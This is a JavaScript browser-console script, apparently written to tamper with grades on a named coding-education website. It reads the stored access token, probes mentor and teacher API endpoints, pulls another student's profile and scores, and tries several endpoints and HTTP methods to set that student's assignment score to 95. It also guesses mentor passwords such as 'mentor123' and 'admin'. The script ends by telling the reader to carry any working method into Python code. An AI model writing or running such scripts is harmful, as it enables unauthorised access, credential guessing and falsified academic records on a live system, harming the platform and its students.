// COMPREHENSIVE SCORE HACKING TEST - COPY TO BROWSER CONSOLE
// Test this while logged in to https://coolcode-hacker-34c5455cd908.herokuapp.com

console.log("🔧 Comprehensive Score Hacking Test");
console.log("=====================================");

const token = localStorage.getItem('ACCESS_TOKEN');
const baseUrl = 'https://coolcode-hacker-34c5455cd908.herokuapp.com';
console.log("Token found:", !!token);
console.log("Token:", token);

// Test 1: Try to understand the current user role
async function checkCurrentUser() {
    console.log("\n👤 Test 1: Checking current user info");
    
    const endpoints = [
        `${baseUrl}/api/user/me`,
        `${baseUrl}/api/api/user/me`,
        `${baseUrl}/api/profile`,
        `${baseUrl}/api/api/profile`,
        `${baseUrl}/api/auth/me`
    ];
    
    for (const endpoint of endpoints) {
        try {
            const response = await fetch(endpoint, {
                headers: {'ACCESS_TOKEN': token}
            });
            
            if (response.ok) {
                const data = await response.json();
                console.log(`✅ ${endpoint}:`, data);
            } else {
                console.log(`❌ ${endpoint}: ${response.status}`);
            }
        } catch (error) {
            console.log(`❌ ${endpoint}: Error`);
        }
    }
}

// Test 2: Check mentor privileges by trying to access mentor endpoints
async function checkMentorAccess() {
    console.log("\n🎓 Test 2: Checking mentor access");
    
    const mentorEndpoints = [
        `${baseUrl}/api/mentor/students`,
        `${baseUrl}/api/api/mentor/students`,
        `${baseUrl}/api/mentor/assignments`,
        `${baseUrl}/api/api/mentor/assignments`,
        `${baseUrl}/api/teacher/students`,
        `${baseUrl}/api/api/teacher/students`
    ];
    
    for (const endpoint of mentorEndpoints) {
        try {
            const response = await fetch(endpoint, {
                headers: {'ACCESS_TOKEN': token}
            });
            
            if (response.ok) {
                const data = await response.json();
                console.log(`✅ MENTOR ACCESS ${endpoint}:`, data);
            } else {
                console.log(`❌ ${endpoint}: ${response.status}`);
            }
        } catch (error) {
            console.log(`❌ ${endpoint}: Error`);
        }
    }
}

// Test 3: Get Caroline's current scores to see the baseline
async function getCarolineScores() {
    console.log("\n📊 Test 3: Getting Caroline's current scores");
    
    const userEndpoints = [
        `${baseUrl}/api/user/98ixul`,
        `${baseUrl}/api/api/user/98ixul`,
        `${baseUrl}/api/user/98ixul/scores`,
        `${baseUrl}/api/api/user/98ixul/scores`,
        `${baseUrl}/api/student/98ixul`,
        `${baseUrl}/api/api/student/98ixul`,
        `${baseUrl}/ui/profile/98ixul`  // This is the profile endpoint you mentioned
    ];
    
    for (const endpoint of userEndpoints) {
        try {
            const response = await fetch(endpoint, {
                headers: {'ACCESS_TOKEN': token}
            });
            
            if (response.ok) {
                const data = await response.json();
                console.log(`✅ Caroline's data ${endpoint}:`, data);
            } else {
                console.log(`❌ ${endpoint}: ${response.status}`);
            }
        } catch (error) {
            console.log(`❌ ${endpoint}: Error`);
        }
    }
}

// Test 4: Try different score submission methods for Assignment 1
async function testScoreSubmission() {
    console.log("\n🎯 Test 4: Testing score submission for Assignment 1");
    
    const target_user = "98ixul";
    const assignment_id = 1;
    const new_score = 95; // Test with 95 first
    
    // Method 1: Original API endpoint
    console.log("Testing original API endpoint...");
    try {
        const response = await fetch(`${baseUrl}/api/api/assignment/score`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'ACCESS_TOKEN': token
            },
            body: JSON.stringify({
                username: target_user,
                assignmentId: assignment_id,
                score: new_score
            })
        });
        
        const result = await response.text();
        console.log(`API method: ${response.status} - ${result}`);
    } catch (error) {
        console.log("API method error:", error);
    }
    
    // Method 2: Form data to profile endpoint (using the correct URL format you mentioned)
    console.log("Testing form data method to Caroline's profile...");
    try {
        const formData = new FormData();
        formData.append('username', target_user);
        formData.append('assignmentId', assignment_id);
        formData.append('score', new_score);
        
        const response = await fetch(`${baseUrl}/ui/profile/98ixul`, {
            method: 'POST',
            headers: {
                'ACCESS_TOKEN': token
            },
            body: formData
        });
        
        const result = await response.text();
        console.log(`Form data method: ${response.status} - ${result}`);
    } catch (error) {
        console.log("Form data method error:", error);
    }
    
    // Method 3: Try mentor profile endpoint (since you mentioned kpEVZz format)
    console.log("Testing mentor profile endpoint...");
    try {
        const formData = new FormData();
        formData.append('username', target_user);
        formData.append('assignmentId', assignment_id);
        formData.append('score', new_score);
        
        const response = await fetch(`${baseUrl}/ui/profile/kpEVZz`, {
            method: 'POST',
            headers: {
                'ACCESS_TOKEN': token
            },
            body: formData
        });
        
        const result = await response.text();
        console.log(`Mentor profile method: ${response.status} - ${result}`);
    } catch (error) {
        console.log("Mentor profile method error:", error);
    }
    
    // Method 4: Try mentor/teacher endpoints
    const mentorEndpoints = [
        `${baseUrl}/api/mentor/assignment/score`,
        `${baseUrl}/api/api/mentor/assignment/score`,
        `${baseUrl}/api/teacher/assignment/score`,
        `${baseUrl}/api/api/teacher/assignment/score`,
        `${baseUrl}/api/mentor/score`,
        `${baseUrl}/api/api/mentor/score`
    ];
    
    for (const endpoint of mentorEndpoints) {
        try {
            console.log(`Testing mentor endpoint: ${endpoint}`);
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'ACCESS_TOKEN': token
                },
                body: JSON.stringify({
                    username: target_user,
                    assignmentId: assignment_id,
                    score: new_score
                })
            });
            
            const result = await response.text();
            console.log(`${endpoint}: ${response.status} - ${result}`);
            
            if (response.ok && (result.includes('success') || result.includes('updated'))) {
                console.log(`🎉 POTENTIAL SUCCESS with ${endpoint}!`);
            }
        } catch (error) {
            console.log(`${endpoint} error:`, error);
        }
    }
    
    // Method 5: Try different HTTP methods
    const methods = ['PUT', 'PATCH'];
    for (const method of methods) {
        try {
            console.log(`Testing ${method} method...`);
            const response = await fetch(`${baseUrl}/api/api/assignment/score`, {
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'ACCESS_TOKEN': token
                },
                body: JSON.stringify({
                    username: target_user,
                    assignmentId: assignment_id,
                    score: new_score
                })
            });
            
            const result = await response.text();
            console.log(`${method}: ${response.status} - ${result}`);
        } catch (error) {
            console.log(`${method} error:`, error);
        }
    }
}

// Test 5: Check if we need to login as mentor first
async function tryMentorLogin() {
    console.log("\n🔑 Test 5: Trying to get mentor access");
    
    // Try to see if there's a mentor login or role switch
    const mentorCredentials = [
        {username: "kpEVZz", password: "mentor123"},
        {username: "kpEVZz", password: "password"},
        {username: "kpEVZz", password: "admin"},
        {username: "Violet", password: "mentor123"},
        {username: "mentor", password: "password"}
    ];
    
    for (const cred of mentorCredentials) {
        try {
            console.log(`Trying mentor login: ${cred.username}`);
            const response = await fetch(`${baseUrl}/api/auth/login`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(cred)
            });
            
            if (response.ok) {
                const data = await response.json();
                console.log(`✅ Mentor login success:`, data);
                if (data.token) {
                    console.log("New mentor token:", data.token);
                    // You could try using this token for score changes
                }
            } else {
                console.log(`❌ ${cred.username}: ${response.status}`);
            }
        } catch (error) {
            console.log(`${cred.username} error:`, error);
        }
    }
}

// Main execution
async function runAllTests() {
    await checkCurrentUser();
    await checkMentorAccess();
    await getCarolineScores();
    await testScoreSubmission();
    await tryMentorLogin();
    
    console.log("\n🎯 Test complete! Check the results above.");
    console.log("If any method showed success, use that approach in your Python code.");
}

// Run all tests
runAllTests();
